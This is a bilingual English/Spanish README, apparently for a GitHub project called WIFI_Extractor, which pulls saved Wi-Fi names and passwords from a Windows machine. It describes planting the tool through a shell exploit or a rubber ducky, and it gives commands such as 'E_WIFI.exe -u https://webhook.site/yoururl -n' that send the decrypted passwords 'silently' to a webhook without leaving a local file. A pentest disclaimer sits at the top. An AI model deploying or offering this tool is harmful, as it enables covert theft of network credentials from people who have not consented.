# WIFI_Extractor

*DISCLAIMER*

This is not made for illegal or malicious purposes, I consider it like a post-exploitation tool with legal authority before of use in whatever location you are doing your pentest to check weak and reutilization of passwords, I'm not responsible of any malicious acts that you may do.

Esto no está hecho con fines ilegales o maliciosos, lo considero como una herramienta de post-explotación con autoridad legal antes del uso en cualquier lugar donde esté haciendo su pentest para verificar la debilidad y la reutilización de contraseñas, no soy responsable de cualquier acto malicioso que puedas hacer.

if you run it with python you might need this requeriments

Si lo ejecutas con python tal vez podrias necesitar estos requerimientos


pip install click

pip install elementpath

pip install requests

Script to extract WIFI passwords from a pc uploading it remotely (shell exploit) and send it to a url "silently"(webhook without leaving files 
and also can be used offline, physically (rubber ducky)

Script para extraer contraseñas WIFI de un pc subiendolo remotamente(shell exploit) y enviarlo a una url "silenciosamente"(webhook) 
Tambien se puede usar offline, físicamente con un pendrive(rubber ducky)


Usage: E_WIFI.exe [OPTIONS]

Options:
  -u, --url TEXT      Webhook/POST URL
  -n, --no-txt        No crea el archivo txt | Doesn't create the txt file
  -v, --version       Imprime la version | Prints the version
  -p, --print-output  Muestra la salida en la terminal | Shows the output in
                      the terminal
  --help              Show this message and exit.
  

Offline

python3 E_WIFIoffline.py

CMD or Powershell E_WIFIoffline.exe | ./E_WIFIoffline.exe (You can also double click it)

Creates a txt with the WIFI's ssid and passwords stored in the local machine
Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local

Online

Usages

default usage
python3 E_WIFI.py

CMD or Powershell E_WIFI.exe | ./E_WIFI.exe

Creates a txt with the WIFI's ssid and passwords stored in the local machine
Crea un txt con los nombres y las contrasenas WIFI guardadas en la maquina local

Another Example

python3 E_WIFI.py -u https://webhook.site/yoururl -n -p 
CMD or Powershell E_WIFI.exe | ./E_WIFI.exe -u https://webhook.site/yoururl -n -p

type --help for more detailed info

PD: THE TXT IS CREATED BY DEFAULT -n TURN IT OFF
    EL TXT SE CREA POR DEFECTO -n APAGA LA CREACION

V1.3

Quick Example of the new function (in the following hours I will update a more detailed one)
Ejemplo rapido de la nueva funcion (en las siguientes horas actualizare con unos ejemplos mas detallados)

E_WIFI.exe -p -a -u webhooksite...
![ejemplo nueva funcion](https://user-images.githubusercontent.com/74321905/225491588-1b1c1de4-0fa2-4981-8aa7-317983d13d6a.png)

"-a" will answer automatically with "Y" because it indicates that the current console is with admin privileges at least if you don't put this option you will need to put manually the option
"-a" respondera automaticamente con "Y" porque indica que la consola actual tiene al menos privilegios de administrador, si no pones esta opcion tendras que responder manualmente

You will see that in the webhook it will be sent with the decrypted password
Podras ver en el webhook que sera enviado con la contrasena desencriptada
![ejemplo nueva funcion2](https://user-images.githubusercontent.com/74321905/225492226-b03d05e1-4f79-4f88-b872-04df838bc34d.png)


Also you can use the E_WIFI to extract the keys and then manually use Wdecryptor with an opened system authority cmd
Tambien podras usar E_WIFI para extraer las keys y luego manualmente usar wdecryptor con una cmd abierta con system authority

![ejemplo nueva funcion3](https://user-images.githubusercontent.com/74321905/225493385-921a6a0f-230c-4a2f-a83c-fa020282db92.png)

it will be saved in a "decrypted.txt" file also with the following format "Encrypted Key : Decrypted"
tambien se guardara en un archivo "decrypted.txt" con el siguiente formato "Key Encriptada : Descriptada"
